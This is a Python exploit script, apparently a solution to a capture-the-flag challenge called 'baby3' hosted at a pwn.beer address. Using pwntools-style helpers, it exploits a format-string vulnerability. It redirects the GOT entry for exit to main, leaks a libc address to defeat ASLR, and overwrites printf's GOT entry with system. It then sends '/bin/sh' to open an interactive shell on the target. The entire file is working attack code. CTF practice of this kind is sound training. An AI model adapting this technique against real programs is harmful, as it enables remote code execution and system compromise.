#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './baby3'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'baby-01.pwn.beer', 'port':10003})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_got_printf     = binf.got['printf']
addr_got_exit       = binf.got['exit']
addr_main           = binf.sep_function['main']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    overwrite = dict()
    overwrite[addr_got_exit] = addr_main
    exploit  = '%25$016p'
    exploit += fmtstr_payload(7, overwrite, numbwritten = 16, write_size = 'short')
    conn.sendlineafter('input: ', exploit)

    addr_libc_main = int(conn.recv(16), 16) - 0xe7
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']

    overwrite = dict()
    overwrite[addr_got_printf] = addr_libc_system
    exploit = fmtstr_payload(6, overwrite, numbwritten = 0, write_size = 'short')
    conn.sendlineafter('input: ', exploit)

    conn.sendline('/bin/sh')

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
